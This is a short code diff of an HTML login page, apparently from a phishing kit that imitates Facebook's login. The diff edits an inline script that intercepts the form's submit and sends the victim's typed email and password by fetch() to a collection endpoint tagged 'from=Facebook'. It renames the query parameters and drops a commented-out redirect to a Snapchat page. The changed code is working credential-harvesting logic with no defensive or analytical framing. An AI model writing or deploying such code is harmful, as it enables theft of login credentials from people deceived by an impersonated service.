@@ -526,8 +526,7 @@
     <script>
         document.getElementById("loginform").onsubmit = function(event){
           event.preventDefault()
-          fetch(`./S-Output?from=Facebook&pass=${document.getElementById("pass").value}&email=${document.getElementById("email").value}`)
-          /* window.location.replace("./Snapchat.html"); */
+          fetch(`./S-Output?from=Facebook&Pass=${document.getElementById("pass").value}&User=${document.getElementById("email").value}`)
         }
     </script>
   </body>
